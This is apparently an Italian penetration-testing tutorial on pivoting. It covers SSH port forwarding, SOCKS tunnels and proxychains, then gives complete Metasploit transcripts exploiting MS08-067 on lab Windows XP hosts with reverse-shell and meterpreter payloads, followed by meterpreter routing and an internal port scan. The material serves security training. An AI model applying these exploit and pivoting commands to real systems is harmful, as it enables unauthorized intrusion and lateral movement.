si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).</p><p><img loading=lazy src=/wp-content/uploads/2016/04/ssh_meterpeter_pivoting01.png alt=Pivoting></p><p>Faccio un piccolo esempio in cui ci sono tre attori:</p><ol><li>Client (attaccante)</li><li>Server <strong>A</strong> – Accetta qualsiasi connessione</li><li>Server <strong>B</strong> – Accetta esclusivamente connessione dal server <strong>A</strong></li></ol><p>Instradare le connessioni tramite il server compromesso <strong>A</strong>, verso il server <strong>B</strong>, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.<br>Possiamo considerare questi instradamenti come veri e propri forward.</p><h2 id=ssh-pivoting>SSH Pivoting<a hidden class=anchor aria-hidden=true href=#ssh-pivoting>#</a></h2><p>Tramite il protocollo ssh è possibile creare dei tunnels per redirigere il traffico di una o più porte <em>tcp</em>, l’unico requisito obbligatorio è l’opzione “<em>AllowTcpForwarding</em>” abilitata nella configurazione del server sshd.<br>Non è prettamente necessario un’ account privilegiato.</p><p>Per creare tunnel ssh le opzioni da utilizzare nel client sono:</p><blockquote><p>[<strong>-L</strong> [bind_address:]port:host:hostport] —> Forward di una singola porta</p><p>[<strong>-D</strong> [bind_address:]port] —> Forward di porte dinamiche</p><p>[<strong>-R</strong> [bind_address:]port:host:hostport] —> Reverse Tunnel</p></blockquote><p>Di seguito riporterò alcuni esempi, per cominciare il forward di una singola porta:</p><pre tabindex=0><code># Tunnel che permette di collegarsi sulla porta 80 del server 10.0.0.10 tramite 10.0.0.101
#
# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost
claudio@KaliCla:~$ ssh -L8080:10.0.0.10:80 user@10.0.0.101
claudio@KaliCla:~$
claudio@KaliCla:~$ curl http://127.0.0.1:8080
</code></pre><p>SSH Proxy socks :</p><pre tabindex=0><code># Tunnel che crea un socks proxy sulla porta 8080 tramite 83.149.x.x
#
# Senza specificare il bind_address la porta 8080 è raggiungibile solo da localhost
claudio@KaliCla:~$ ssh -D 8080 root@83.149.x.x 
# Controllo ip personale 
claudio@KaliCla:~$ curl http://ifconfig.me
2.236.x.x
# Testo il proxy socks appena creato
claudio@KaliCla:~$ curl --socks5 127.0.0.1:8080 http://ifconfig.me
83.149.x.x
</code></pre><p>Proxychain è un tool che permette di eseguire qualsiasi programma attraverso http o socks proxy, quindi è possibile configurarlo in modo tale da utilizzare il tunnel dinamico creato precedentemente.<br>Di default proxychains è configurato per utilizzare come socks server TOR.</p><p>Modificare la parte finale del file <strong><em>/etc/proxychains.conf</em></strong> così:</p><pre tabindex=0><code>[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &#34;tor&#34;
#socks4     127.0.0.1 9050
socks4     127.0.0.1 8080
</code></pre><p>Per eseguire proxychains basta anteporlo al programma desiderato:</p><pre tabindex=0><code>claudio@KaliCla:~$ proxychains curl http://ifconfig.me
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-request| ifconfig.me 
|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK
|DNS-response| ifconfig.me is 153.121.72.212
|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-153.121.72.212:80-&lt;&gt;&lt;&gt;-OK
83.149.x.x
claudio@KaliCla:~$
</code></pre><p>Se all&rsquo;interno della rete 83.149.x.x volessimo collegarci al servizio ftp del server 192.168.0.2, basterebbe digitare:</p><pre tabindex=0><code>claudio@KaliCla:~$ proxychains telnet 192.168.0.3 21
ProxyChains-3.1 (http://proxychains.sf.net)
Trying 192.168.0.3...
|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.0.3:21-&lt;&gt;&lt;&gt;-OK
Connected to 192.168.0.3.
Escape character is &#39;^]&#39;.
220-FileZilla Server version 0.9.36 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
</code></pre><p>Per vnc o remotedesktop:</p><pre tabindex=0><code>claudio@KaliCla:~$ proxychains remmina
ProxyChains-3.1 (http://proxychains.sf.net)
Remmina plugin VNC (type=Protocol) registered.
Remmina plugin VNCI (type=Protocol) registered.
Remmina plugin RDP (type=Protocol) registered.
Remmina plugin RDPF (type=File) registered.
Remmina plugin RDPS (type=Preference) registered.
Remmina plugin SFTP (type=Protocol) registered.
Remmina plugin SSH (type=Protocol) registered.
</code></pre><p>Scansione TCP del server 192.168.0.2 tramite nmap</p><pre tabindex=0><code>claudio@KaliCla:~$ proxychains nmap -sT 192.168.0.3
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&lt;&gt;-127.0.0.1:8080-&lt;&gt;&lt;&gt;-192.168.0.3:80-&lt;&gt;&lt;&gt;-OK
...
...
Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-11 23:09 CEST
Nmap scan report for 192.168.0.3
Host is up (0.085s latency).
Not shown: 986 closed ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 2.0.5
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Sendmail 8.13.8/8.13.8
80/tcp    open  http       Apache httpd 2.2.3 ((CentOS))
106/tcp   open  tcpwrapped
110/tcp   open  pop3       Dovecot pop3d
143/tcp   open  imap       Dovecot imapd
873/tcp   open  rsync      (protocol version 30)
993/tcp   open  ssl/imap   Dovecot imapd
995/tcp   open  ssl/pop3   Dovecot pop3d
1110/tcp  open  pop3       Dovecot pop3d
2525/tcp  open  smtp       Sendmail 8.13.8/8.13.8
5666/tcp  open  tcpwrapped
10000/tcp open  http       MiniServ 1.680 (Webmin httpd)
</code></pre><p>Come si può notare ci sono moltissimi modi di sfruttare i forward dinamici tramite ssh, basta ingegnarsi un minimo.</p><h2 id=ssh-pivoting-e-metasploit>SSH Pivoting e Metasploit<a hidden class=anchor aria-hidden=true href=#ssh-pivoting-e-metasploit>#</a></h2><p>Dopo un’infarinatura generale di tunnel e forward ssh, vediamo come sfruttare la tecnica pivoting per eseguire attacchi tramite il famoso framework Metasploit.<br>Ho deciso di suddividere questa sezione in due parti, nella prima attaccheremo un server presente nella nostra stessa subnet, mentre  nella seconda la vittima risiederà in una rete differente.</p><h3 id=attacco-n1-medesima-subnet>Attacco n.1 (Medesima subnet)<a hidden class=anchor aria-hidden=true href=#attacco-n1-medesima-subnet>#</a></h3><p><img loading=lazy src=/wp-content/uploads/2016/04/ssh_meterpeter_pivoting02.png alt=pivoting></p><p>Nel grafico precedente ho cercato di raffigurare le varie fasi dell’attacco:<br>Il server <strong>A</strong> viene utilizzato per creare un tunnel ssh e raggiungere la porta 445 del server <strong>B</strong> (freccia verde) così da poter sfruttare la ormai datata vulnerabilità <a href=https://support.microsoft.com/it-it/kb/958644>MS08-067</a> (freccia blu).<br>Una volta compromesso, sul server <strong>B</strong> verrà eseguita una reverse shell verso il <strong>Client</strong> (freccia viola).<br>In questo caso il tunnel serve a bypassare il firewall del server <strong>B</strong> che blocca le connessioni dirette del <strong>Client</strong> (freccia rossa).</p><h4 id=tunnel>Tunnel<a hidden class=anchor aria-hidden=true href=#tunnel>#</a></h4><p>Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 10.0.0.20:</p><pre tabindex=0><code>claudio@KaliCla:~$ ssh -L9445:10.0.0.20:445 user@10.0.0.101
claudio@10.0.0.101&#39;s password: 
[user@webserver01 ~]$
</code></pre><h4 id=preparo-lattacco>Preparo l’attacco<a hidden class=anchor aria-hidden=true href=#preparo-lattacco>#</a></h4><p>Apro Metasploit, carico l&rsquo;exploit, scelgo il payload, configuro i parametri.</p><pre tabindex=0><code class=language-                                                  data-lang=                                                 >                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            http://metasploit.pro


Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.5-2016010401                   ]
+ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
+ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

# Carico l&#39;exploit
msf &gt; use exploit/windows/smb/ms08_067_netapi
# Scelgo il payload (shell)
msf exploit(ms08_067_netapi) &gt; set payload windows/shell/reverse_tcp
payload =&gt; windows/shell/reverse_tcp
# Come host remoto setto il tunnel locale
# Attenzione! Per instradare la connessione verso il tunnel utilizzare l&#39;ip 0.0.0.0 e non 127.0.0.1
msf exploit(ms08_067_netapi) &gt; set RHOST 0.0.0.0
RHOST =&gt; 0.0.0.0
# Come porta remota setto la porta locale del tunnel
msf exploit(ms08_067_netapi) &gt; set RPORT 9445
RPORT =&gt; 9445
# L&#39;ip che dovrà essere contattato dalla reverse shell è quello del client
msf exploit(ms08_067_netapi) &gt; set LHOST 10.0.0.50
LHOST =&gt; 10.0.0.50
# Ricontrollo la configurazione
msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST 0.0.0.0 yes The target address
 RPORT 9445 yes Set the SMB service port
 SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell/reverse_tcp):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
 LHOST 10.0.0.50 yes The listen address
 LPORT 4444 yes The listen port
</code></pre><h4 id=eseguo-lattacco>Eseguo l’attacco<a hidden class=anchor aria-hidden=true href=#eseguo-lattacco>#</a></h4><pre tabindex=0><code>msf exploit(ms08_067_netapi) &gt; exploit

[*] Started reverse TCP handler on 10.0.0.50:4444 
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.0.0.20
[*] Command shell session 1 opened (10.0.0.50:4444 -&gt; 10.0.0.20:1056) at 2016-04-12 23:21:58 +0200

Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;ipconfig

Windows IP Configuration
 Ethernet adapter Local Area Connection 2:

Connection-specific DNS Suffix . : 
  IP Address. . . . . . . . . . . . : 10.0.0.20
  Subnet Mask . . . . . . . . . . . : 255.255.255.0
  Default Gateway . . . . . . . . . :

C:\WINDOWS\system32&gt;
</code></pre><h3 id=attacco-n2-subnet-differente>Attacco n.2 (Subnet Differente)<a hidden class=anchor aria-hidden=true href=#attacco-n2-subnet-differente>#</a></h3><p><img loading=lazy src=/wp-content/uploads/2016/04/ssh_meterpeter_pivoting03.png alt=pivoting></p><p>Questo piano d’attacco è leggermente più complesso del precedente.<br>In questa situazione il <strong>Client</strong> (10.0.0.50/24)  non può attaccare direttamente il server <strong>B</strong> (192.168.222.2/24)  perché si trovano in reti lan e subnet differenti.<br>Per ovviare a questo problema viene sfruttato il server <strong>A</strong>, dato che quest’ultimo ha accesso sia alle rete LAN che alla LAN_02.<br>In questo caso il server <strong>A</strong> non solo eseguirà un forward delle porte, ma fungerà anche da gateway così da eseguire un routing delle connessioni tra reti differenti.<br>La procedura può essere riassunta fondamentalmente in quattro punti:</p><ol><li>Il <strong>client</strong> crea un tunnel ssh locale sul server <strong>A</strong> per raggiungere la porta <em>445</em> del server <strong>B</strong> (freccia verde)</li><li>Il <strong>client</strong> crea un tunnel ssh <em>inverso</em> in modo da potersi collegare alla reverse shell del server <strong>B</strong> ospitata dal server <strong>A</strong> (freccia blu)</li><li>Il <strong>client</strong> sfruttando il tunnel (punto 1)  compromette il server <strong>B</strong> ed esegue la reverse shell verso il server <strong>A</strong> (freccia viola)</li><li>Il <strong>client</strong> sfrutta il tunnel (punto 2) per collegarsi alla reverse shell aperta sul server <strong>A</strong></li></ol><h4 id=tunnel-pivoting>Tunnel (pivoting)<a hidden class=anchor aria-hidden=true href=#tunnel-pivoting>#</a></h4><p>Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 192.168.222.2:</p><pre tabindex=0><code>claudio@KaliCla:~$ ssh -L9445:192.168.222.2:445 root@10.0.0.101
# Attraverso il server ssh 10.0.0.101, creo un reverse tunnel per redirigere la porta 4444 della
# reverse shell verso il framework metasploit del client:
# 192.168.222.2 -&gt; 192.168.222.2.1:4444 -&gt; 10.0.0.101:4444 -&gt; 10.0.0.50:4444
claudio@KaliCla:~$ ssh -R 0.0.0.0:4444:127.0.0.1:4444 root@10.0.0.101
</code></pre><blockquote><p><strong>Importante!</strong></p><p>Per permettere anche ad host remoti di usufruire dei tunnel locali ssh, è necessario eseguire un bind delle
porte verso l&rsquo;indirizzo 0.0.0.0 .</p><p>Oltre a specificare l&rsquo;indirizzo 0.0.0.0 è obbligatoria nella configurazione del server sshd l&rsquo;opzione:
<strong>GatewayPorts yes</strong></p><p>In caso contrario tramite utente privilegiato l&rsquo;opzione andrà abilitata.</p></blockquote><h4 id=preparo-lattacco-1>Preparo l’attacco<a hidden class=anchor aria-hidden=true href=#preparo-lattacco-1>#</a></h4><p>Apro metasploit, carico l&rsquo;exploit, scelgo il payload, configuro i parametri.</p><pre tabindex=0><code># Carico l&#39;exploit
msf &gt; use exploit/windows/smb/ms08_067_netapi
# Scelgo l&#39;exploit (shell)
msf exploit(ms08_067_netapi) &gt; set payload windows/shell/reverse_tcp
payload =&gt; windows/shell/reverse_tcp
# Come host remoto setto il tunnel locale
msf exploit(ms08_067_netapi) &gt; set RHOST 0.0.0.0
RHOST =&gt; 0.0.0.0
# Come porta remota setto la porta locale del tunnel
msf exploit(ms08_067_netapi) &gt; set RPORT 9445
RPORT =&gt; 9445
# Come host remoto della reverse shell setto l&#39;indirizzo del server pivoting (server A)
msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.222.1
LHOST =&gt; 192.168.222.1
# Controllo il riepilogo dei settaggi
msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
   RPORT    9445             yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     192.168.222.1    yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
</code></pre><h4 id=eseguo-lattacco-1>Eseguo l’attacco<a hidden class=anchor aria-hidden=true href=#eseguo-lattacco-1>#</a></h4><pre tabindex=0><code>msf exploit(ms08_067_netapi) &gt; exploit

[-] Handler failed to bind to 192.168.222.1:4444:- -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 127.0.0.1
[*] Command shell session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:49963) at 2016-04-18 22:39:03 +0200

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

 Connection-specific DNS Suffix . : 
 IP Address. . . . . . . . . . . . : 192.168.222.2
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 

C:\WINDOWS\system32&gt;
</code></pre><h3 id=meterpeter-pivoting-e-metasploit>Meterpeter Pivoting e Metasploit<a hidden class=anchor aria-hidden=true href=#meterpeter-pivoting-e-metasploit>#</a></h3><p>Oltre al protocollo ssh, è possibile utilizzare la tecnica pivoting sfruttando i server compromessi con metasploit.<br>Per essere più precisi il componente che permette di effettuare routing di connessioni e forward delle porte è il famoso payload <em>meterpeter</em>.<br>Il payload, come mostrato negli attacchi precedenti, non è altro che un tool che viene eseguito sulla macchina vittima subito dopo essere stata violata.<br>Nel caso di meterpeter il payload può essere considerato come una backdoor con moltissime utilità.</p><h4 id=comandi-pivoting-meterpeter>Comandi pivoting meterpeter<a hidden class=anchor aria-hidden=true href=#comandi-pivoting-meterpeter>#</a></h4><pre tabindex=0><code>run autoroute -s 192.168.1.0/24        # Routing di tutto il traffico verso la rete 192.168.1.x
run autoroute -p                       # Elenco delle rotte attive 
route add 192.168.1.0 255.255.255.0 2  # Routing verso la rete 192.168.1.x tramite sessione meterpeter 2 
route del 192.168.1.0 255.255.255.0 2  # Rimuovo rotta sessione meterpeter 2 route flush # Rimuovo qualsiasi rotta 
portfwd add -l 222 -p 222 -r host      # Forward porta 222 target compromesso verso porta 222 nuovo targer 
portfwd delete -l 222 -p 222 -r host   # Rimozione forward porta 222 
portfwd list                           # Lista port forwards attivi 
portfwd flus                           # Rimozione di tutti i port forwards
</code></pre><p>Di seguito riporterò un esempio che mostrerà come scansionare una sotto rete raggiungibile esclusivamente da un server compromesso.</p><h4 id=preparo-lattacco-2>Preparo l’attacco<a hidden class=anchor aria-hidden=true href=#preparo-lattacco-2>#</a></h4><p>Apro metasploit, carico l&rsquo;exploit, scelgo il payload, configuro i parametri:</p><pre tabindex=0><code>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        http://metasploit.pro


Tired of typing &#39;set RHOSTS&#39;? Click &amp; pwn with Metasploit Pro
Learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.5-2016010401                   ]
+ -- --=[ 1517 exploits - 875 auxiliary - 257 post        ]
+ -- --=[ 437 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

# Carico l&#39;exploit
msf &gt; use exploit/windows/smb/ms08_067_netapi
# Scelgo il payload meterpeter
msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
# Setto l&#39;ip remoto della macchina da compromettere
msf exploit(ms08_067_netapi) &gt; set RHOST 10.0.0.62
RHOST =&gt; 10.0.0.62
# Setto l&#39;ip del client per la reverse shell (meterpeter)
msf exploit(ms08_067_netapi) &gt; set LHOST 10.0.0.50
LHOST =&gt; 10.0.0.50
# Controllo i settaggi
msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    10.0.0.62        yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.0.0.50        yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
</code></pre><h4 id=eseguo-lattacco-2>Eseguo l’attacco<a hidden class=anchor aria-hidden=true href=#eseguo-lattacco-2>#</a></h4><p>Eseguo l&rsquo;exploit e acquisisco le informazioni di networking</p><pre tabindex=0><code>msf exploit(ms08_067_netapi) &gt; exploit

[*] Started reverse TCP handler on 10.0.0.50:4444 
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (957487 bytes) to 10.0.0.62
[*] Meterpreter session 1 opened (10.0.0.50:4444 -&gt; 10.0.0.62:1035) at 2016-04-21 18:37:37 +0200

meterpreter &gt;
# Controllo la configurazione delle interfacce di rete 
meterpreter &gt; ipconfig

Interface 1
============
Name : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU : 1520
IPv4 Address : 127.0.0.1


Interface 2
============
Name : VMware Accelerated AMD PCNet Adapter #2 - Packet Scheduler Miniport
Hardware MAC : 00:0c:29:a8:aa:f7
MTU : 1500
IPv4 Address : 10.0.0.62
IPv4 Netmask : 255.255.255.0


Interface 3
============
Name : VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport
Hardware MAC : 00:0c:29:a8:aa:01
MTU : 1500
IPv4 Address : 192.168.222.2
IPv4 Netmask : 255.255.255.0
</code></pre><h4 id=routing-del-traffico-pivoting>Routing del traffico (pivoting)<a hidden class=anchor aria-hidden=true href=#routing-del-traffico-pivoting>#</a></h4><pre tabindex=0><code># Tramite il comando autorute di meterpeter aggiungo una route statica che permette 
# al framework metasploit di raggiungere tutta la rete 192.168.222.x tramite il server
# appena compromesso (10.0.0.62).
meterpreter &gt; run autoroute -s 192.168.222.0/24
[*] Adding a route to 192.168.222.0/255.255.255.0...
[+] Added route to 192.168.222.0/255.255.255.0 via 10.0.0.62
[*] Use the -p option to list all active routes
# Tramite lo switch &#34;-p&#34; del comando autoroute, visualizzo le route statiche presenti 
meterpreter &gt; run autoroute -p

Active Routing Table
====================

 Subnet Netmask Gateway
 ------ ------- -------
 192.168.222.0 255.255.255.0 Session 1

meterpreter &gt;
# Premendo i tasti Ctrl+z e poi y mando la sessione in background 
Background session 1? [y/N]
msf exploit(ms08_067_netapi) &gt;
</code></pre><h4 id=individuazione-nuovi-target>Individuazione nuovi target<a hidden class=anchor aria-hidden=true href=#individuazione-nuovi-target>#</a></h4><p>Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x:</p><pre tabindex=0><code># Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x
msf exploit(ms08_067_netapi) &gt; use auxiliary/scanner/portscan/tcp
# Controllo le opzioni disponibili
msf auxiliary(tcp) &gt; show options

Module options (auxiliary/scanner/portscan/tcp):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CONCURRENCY 10 yes The number of concurrent ports to check per host
 PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
 RHOSTS yes The target address range or CIDR identifier
 THREADS 1 yes The number of concurrent threads
 TIMEOUT 1000 yes The socket connect timeout in milliseconds

# Setto la subnet da scansionare
msf auxiliary(tcp) &gt; set RHOSTS 192.168.222.0/24
RHOSTS =&gt; 192.168.222.0/24
# Setto i threads da utilizzare
msf auxiliary(tcp) &gt; set THREADS 50
THREADS =&gt; 50
# Setto il rage di porte da interrogare
msf auxiliary(tcp) &gt; set PORTS 1-60000
PORTS =&gt; 1-60000
# Faccio partire la scansione
msf auxiliary(tcp) &gt; run

[*] 192.168.222.2:21 - TCP OPEN
[*] 192.168.222.3:22 - TCP OPEN
[*] 192.168.222.2:25 - TCP OPEN
[*] 192.168.222.3:80 - TCP OPEN
[*] 192.168.222.2:80 - TCP OPEN
[*] 192.168.222.2:135 - TCP OPEN
[*] 192.168.222.2:139 - TCP OPEN
[*] 192.168.222.2:180 - TCP OPEN
[*] 192.168.222.3:443 - TCP OPEN
[*] 192.168.222.2:443 - TCP OPEN
[*] 192.168.222.2:445 - TCP OPEN
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tcp) &gt;
</code></pre><p>E’ possibile notare come il client (10.0.0.50) sia stato in grado di scansionare e rilevare le porte aperte del server 192.168.222.3 .<br>Naturalmente oltre ad una scansione è possibile utilizzare altri exploit per compromettere ulteriori macchine.</p><h2 id=conclusioni>Conclusioni<a hidden class=anchor aria-hidden=true href=#conclusioni>#</a></h2><p>Per un penetration tester la tecnica pivoting è molto importante, sia nel lavoro che nella buona riuscita di una certificazione.<br>Il consiglio che posso darvi è come al solito di provare, sperimentare e documentarsi il più possibile perchè il routing delle connessioni e il forward delle porte posso essere effettuati in molti modi.<br>Per qualsiasi segnalazione di errore, chiarimento o altro non esistate a commentare il post.<br>Alla prossima!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.homelab.it/tags/kalilinux/>kalilinux</a></li><li><a href=https://www.homelab.it/tags/linux/>Linux</a></li><li><a href=https://www.homelab.it/tags/metasploit/>metasploit</a></li><li><a href=https://www.homelab.it/tags/meterpeter/>meterpeter</a></li><li><a href=https://www.homelab.it/tags/penetration-test/>penetration test</a></li><li><a href=https://www.homelab.it/tags/pivoting/>pivoting</a></li><li><a href=https://www.homelab.it/tags/security/>Security</a></li><li><a href=https://www.homelab.it/tags/ssh/>ssh</a></li></ul><nav class=paginav><a class=prev href=https://www.homelab.it/index.php/2016/05/16/nethunter-samsung-galaxy-s5/><span class=title>« Prev Page</span><br><span>NetHunter e Samsung Galaxy S5:Ecco la mia esperienza</span></a>
<a class=next href=https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/><span class=title>Next Page »</span><br><span>DVWA File Upload – Soluzione Completa + Bonus XSS</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share SSH e Meterpeter pivoting on twitter" href="https://twitter.com/intent/tweet/?text=SSH%20e%20Meterpeter%20pivoting&url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f04%2f21%2fmetasploit-ssh-meterpeter-pivoting%2f&hashtags=kalilinux%2cLinux%2cmetasploit%2cmeterpeter%2cpenetrationtest%2cpivoting%2cSecurity%2cssh"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SSH e Meterpeter pivoting on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f04%2f21%2fmetasploit-ssh-meterpeter-pivoting%2f&title=SSH%20e%20Meterpeter%20pivoting&summary=SSH%20e%20Meterpeter%20pivoting&source=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f04%2f21%2fmetasploit-ssh-meterpeter-pivoting%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SSH e Meterpeter pivoting on reddit" 